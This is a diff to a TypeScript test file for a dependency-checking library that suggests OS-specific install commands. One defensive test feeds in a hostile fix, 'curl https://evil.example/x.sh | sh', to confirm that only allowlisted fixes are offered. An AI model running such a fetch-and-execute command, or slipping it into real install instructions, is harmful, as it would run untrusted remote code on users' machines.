@@ -19,7 +19,7 @@ const dep = (
   breaks: [],
   fix: [
     { os: "linux", command: `sudo apt install ${id}` },
-    { os: "win32", command: `winget install ${id}` },
+    { os: "win32", command: `winget install --id Fake.${id}` },
   ],
 });
 
@@ -53,7 +53,7 @@ describe("deps-lib", () => {
   test("the fix is the command of the host's own OS, and null when it has none", () => {
     const item = dep("gh", "optional", "missing");
     expect(fixFor(item, "linux")).toBe("sudo apt install gh");
-    expect(fixFor(item, "win32")).toBe("winget install gh");
+    expect(fixFor(item, "win32")).toBe("winget install --id Fake.gh");
     expect(fixFor(item, "darwin")).toBeNull();
     expect(fixFor({ ...item, fix: [] }, "linux")).toBeNull();
   });
@@ -69,16 +69,21 @@ describe("deps-lib", () => {
   });
 
   test("the app offers a fix only when it is on the allowlist, whatever a host sends (HD-m2)", () => {
-    const evil = dep("git", "required", "missing", {
+    const evil: DepResult = {
+      ...dep("git", "required", "missing"),
       fix: [
         {
           os: "linux",
           command: "curl https://evil.example/x.sh | sh",
           url: "https://evil.example",
         },
-        { os: "darwin", command: "brew install git", url: "https://git-scm.com/downloads" },
+        {
+          os: "darwin" as const,
+          command: "brew install git",
+          url: "https://git-scm.com/downloads",
+        },
       ],
-    });
+    };
     expect(fixFor(evil, "linux")).toBeNull();
     expect(fixPageFor(evil, "linux")).toBeNull();
     expect(fixFor(evil, "darwin")).toBe("brew install git");
